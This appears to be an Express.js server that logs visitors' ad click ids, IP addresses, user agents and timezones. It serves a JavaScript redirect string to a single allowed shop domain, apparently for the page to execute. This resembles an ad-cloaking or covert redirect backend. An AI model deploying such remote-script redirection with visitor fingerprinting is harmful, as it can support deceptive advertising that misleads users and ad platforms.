import express from "express";

const app = express();

const FINAL_REDIRECT_URL = "https://example.com";

// ✅ CORS middleware (REQUIRED)
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "https://refliefcart.shop");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, x-client-timezone");
  res.setHeader("Access-Control-Allow-Methods", "GET");
  next();
});

app.get("/getData", (req, res) => {
  const gclid = req.query.gclid || "";
  const timezone = req.headers["x-client-timezone"] || "unknown";

  console.log({
    gclid,
    timezone,
    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress,
    ua: req.headers["user-agent"],
    time: new Date().toISOString()
  });

  const redirectUrl = gclid
    ? `${FINAL_REDIRECT_URL}?gclid=${encodeURIComponent(gclid)}`
    : FINAL_REDIRECT_URL;

  res.json({
    code: `window.location.replace("${redirectUrl}");`
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
